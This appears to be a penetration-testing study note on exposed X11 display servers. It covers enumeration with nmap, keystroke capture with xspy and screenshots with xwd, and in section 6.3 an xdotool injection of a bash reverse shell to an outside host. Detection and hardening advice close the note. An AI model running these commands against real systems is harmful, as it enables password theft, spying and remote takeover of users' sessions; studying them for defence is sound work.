---
tags: [x11, gui, keystroke-logging, screen-capture, unauthenticated]
difficulty: intermediate
module: "35 - Network Protocol Attacks"
topic: "35.30 X11"
---

# X11 — Exposed Display Server

## 1. Executive Summary
The X Window System (commonly referred to as X11 or simply X) is the foundational display hardware abstraction layer and graphical user interface (GUI) framework for Unix and Linux operating systems. Designed in the 1980s, X11 was built with network transparency at its core. This means that graphical applications do not need to run on the same physical machine where the display and user input occur. 

While this architecture provides immense flexibility for remote computing, it introduces severe security implications when misconfigured. The most prevalent vulnerability occurs when an X server is exposed to the network without adequate access controls (e.g., via the reckless use of `xhost +`). In such scenarios, any unauthenticated attacker on the network can connect directly to the X server. Once connected, the attacker can silently capture all keystrokes, take continuous screenshots of the user's desktop, and dynamically inject commands into open terminal windows, leading to complete session hijacking and potential privilege escalation.

## 2. Technical Architecture: The X Window System
The architecture of X11 often confuses those accustomed to modern protocols, because the traditional "client" and "server" roles feel inverted.
- **The X Server:** Runs on the user's local workstation (the machine with the physical monitor, keyboard, and mouse). The server manages the hardware displays, tracks mouse movements, processes keystrokes, and listens for instructions on how to draw windows. By default, it listens on **TCP port 6000 + N** (where N is the display number, typically 0, meaning TCP port 6000).
- **The X Client:** The actual graphical application (e.g., Firefox, xterm, or GNOME Terminal). The application connects *back* to the X Server and requests it to render graphical elements, while receiving input events in return.

### 2.1 Display Variables
When an X client starts, it looks at the `DISPLAY` environment variable to determine where to send its GUI data.
The format is `hostname:displaynumber.screennumber`.
- `DISPLAY=:0` -> Connect to the local X server via UNIX domain sockets (e.g., `/tmp/.X11-unix/X0`).
- `DISPLAY=192.168.1.50:0` -> Connect to the remote X server at 192.168.1.50 on TCP port 6000.

## 3. ASCII Architecture Diagram: X11 Misconfiguration and Exploitation

```text
+-------------------+                               +--------------------+
|  Remote Server    |                               |  User Workstation  |
|  (X Client App)   |                               |  (X11 Server)      |
|  e.g., xterm      |                               |  IP: 192.168.1.50  |
+-------------------+                               +--------------------+
         |                                                    |
         |         Requires Display to Draw GUI               |
         | -------------------------------------------------> | (Listens on TCP 6000)
         |         Requires Keyboard Input                    |
         | <================================================= | (Renders GUI)
         |                                                    |
         |                                                    |
+-------------------+                                         |
|    Attacker       |       Unauthenticated Connect           |
| (Malicious Client)|       (Because `xhost +` was run)       |
|  IP: 192.168.1.99 | --------------------------------------> |
+-------------------+      (Tools: xspy, xwd, xwininfo)       |
         |                                                    |
         | <================================================= | (Captures ALL Keystrokes)
         | <================================================= | (Captures Screen Frames)
         | -------------------------------------------------> | (Injects Fake Keystrokes)
```

## 4. Attack Vectors and Misconfigurations
### 4.1 The `xhost +` Misconfiguration
The `xhost` utility controls host-based access to the X server. When users encounter "Cannot open display" errors (often when trying to run graphical applications via `su` or remote SSH sessions without forwarding), a common, lazy workaround is to execute `xhost +`.
This command explicitly disables all access control, granting **anyone** on the network permission to connect to the X server. If the X server is configured to listen on a TCP port, it becomes an open target.

### 4.2 MIT-MAGIC-COOKIE-1 Theft
Modern X11 relies on token-based authentication rather than host-based authentication. The `xauth` system generates a cryptographic cookie (the MIT-MAGIC-COOKIE-1). This cookie is stored in the user's `~/.Xauthority` file. If an attacker can read this file (e.g., via Local File Inclusion (LFI), a compromised service, or a shared NFS mount), they can extract the cookie, apply it to their own environment, and authenticate to the target's X server.

### 4.3 Unencrypted Traffic
Native X11 traffic over TCP port 6000 is entirely unencrypted. An attacker positioned to perform Man-in-the-Middle (MitM) attacks (e.g., via ARP spoofing) can sniff the network traffic, extract the MIT-MAGIC-COOKIE-1, and perfectly reconstruct the display frames and keystrokes in transit.

## 5. Enumeration Methodology
### 5.1 Network Scanning
To identify exposed X11 servers, perform a targeted port scan on the standard X11 range (TCP 6000-6063).
```bash
# Basic version detection scan
nmap -p 6000-6005 -sV <target-ip>

# Detailed NSE script scan to explicitly check for open access
nmap -p 6000-6005 --script x11-access <target-ip>
```
**Example Nmap Output:**
```text
PORT     STATE SERVICE VERSION
6000/tcp open  x11     (access denied)
6001/tcp open  x11     (access granted)  <-- Target identified
|_x11-access: X server access is granted
```

### 5.2 Manual Verification with `xdpyinfo`
If an open port is found, you can manually verify access using the standard `xdpyinfo` utility.
```bash
# Attempt to query display :1
xdpyinfo -display 192.168.1.50:1
```
If the command outputs a massive block of text detailing the display resolution, color depth, and loaded extensions, you have full unauthenticated access. If it returns `Authorization required, but no authorization protocol specified`, access controls are correctly enforced.

## 6. Exploitation Techniques
Once unauthenticated access is confirmed, an attacker can leverage native X11 utilities to thoroughly compromise the session. No custom exploits or memory corruption payloads are required; this abuses the intended design of the protocol.

### 6.1 Keystroke Logging (`xspy`)
Because the X server inherently manages keyboard input and broadcasts events to connected clients, an attacker can explicitly request a copy of all keyboard events. The tool `xspy` perfectly accomplishes this without alerting the legitimate user.
```bash
# Compile xspy (often requires libx11-dev)
gcc -o xspy xspy.c -lX11

# Execute xspy against the target display
./xspy -display 192.168.1.50:1
```
This tool will output every keystroke the user types on their physical keyboard. This includes passwords typed into terminal `sudo` prompts, web browser login forms, or instant messaging applications.

### 6.2 Screen Capturing (`xwd` and `xwininfo`)
An attacker can silently capture screenshots of the target's desktop to map out the environment and steal sensitive data visible on the screen.
```bash
# Capture the entire root window (full desktop) to a file
xwd -root -screen -display 192.168.1.50:1 -out desktop_capture.xwd

# Convert the XWD format to a standard PNG using ImageMagick
convert desktop_capture.xwd desktop_capture.png
```
To capture a specific window, you can first list all windows using `xwininfo -root -tree -display 192.168.1.50:1` and target a specific window ID.

### 6.3 Window Injection and Reverse Shells (`xdotool`)
If an administrator has a terminal window open on their desktop, an attacker can use `xdotool` to inject artificial keystrokes directly into that specific window.
```bash
# Set the target display
export DISPLAY=192.168.1.50:1

# Type a reverse shell command into the active window
xdotool type 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1'

# Simulate pressing the Return (Enter) key to execute the command
xdotool key Return
```
If the active window is a root shell, the attacker immediately gains a root reverse shell.

## 7. Post-Exploitation
Compromising an X11 server equates to a total compromise of the user's graphical session. From here, attackers can:
- **Steal SSH Keys:** Monitor the clipboard or inject commands to copy `~/.ssh/id_rsa`.
- **Hijack Authenticated Sessions:** Interact with the user's web browser, export cookies, or force the browser to navigate to malicious sites.
- **Privilege Escalation:** If the user executes `sudo`, the attacker can capture the password via `xspy` and subsequently use it.

## 8. Defensive Evasion: SSH X11 Forwarding
To avoid the security pitfalls of raw X11 over TCP, administrators should exclusively use SSH X11 forwarding. By connecting with `ssh -X user@target` (or `ssh -Y` for trusted forwarding), SSH creates a secure, encrypted tunnel.
It automatically sets the `DISPLAY` variable to a local loopback interface (e.g., `localhost:10.0`) and securely transmits the X11 data inside the SSH protocol. It also automatically handles the MIT-MAGIC-COOKIE-1 exchange, ensuring no data is transmitted in plaintext and TCP port 6000 does not need to be exposed.

## 9. Incident Response & Detection
### 9.1 Network Traffic Analysis
- **Wireshark Filter:** `x11`
- Look for TCP connections to ports 6000-6010 originating from unexpected IP addresses. 
- Analyze the X11 connection setup packets. If the `Authorization Protocol Name` field is empty or missing, unauthenticated access was attempted or granted.

### 9.2 Endpoint Monitoring (SIEM)
Monitor command-line execution logs (Sysmon Event ID 1 or Auditd) for high-risk commands.
- Alert on any execution of `xhost +`.
- Alert on the execution of `xwd`, `xspy`, or `xdotool` indicating potential exploitation activity.

## 10. Remediation & Hardening Guide
- **Disable `xhost +` entirely:** Educate developers and administrators to never disable X11 access controls. If remote access is required, define specific hosts (`xhost +192.168.1.50`) or switch to `xauth`.
- **Disable TCP Listening (-nolisten tcp):** Ensure the X server is configured to *not* listen on network interfaces. Modern Linux distributions enforce this by default. The X server should only use local UNIX domain sockets (`/tmp/.X11-unix/X0`).
  - To verify, check the X server process: `ps aux | grep X`. Ensure `-nolisten tcp` is present in the arguments.
- **Use Encrypted Tunnels:** Always use SSH X11 forwarding (`ssh -X`) instead of direct remote X11 connections.
- **Protect `.Xauthority`:** Ensure strict file permissions (`600`) on the `~/.Xauthority` file so that other users on a shared system cannot steal the authentication cookie.

## 11. Chaining Opportunities
- **[[10 - SSH Port Forwarding and Tunneling]]:** Attackers often use SSH local port forwarding to bypass edge firewalls and access an internal X11 port bound to `localhost`.
- **[[40 - Local File Inclusion (LFI)]]:** If a web application has an LFI vulnerability, an attacker can read the `~/.Xauthority` file to steal the MIT-MAGIC-COOKIE-1 and authenticate to the display server.
- **[[42 - Linux Privilege Escalation]]:** Injecting commands into a root-owned terminal session via `xdotool` is a direct path to root.

## 12. Related Notes
- [[29 - VNC — No Authentication, Weak Password]]
- [[17 - Keylogging and Spyware]]
- [[18 - Internal Network Scanning]]
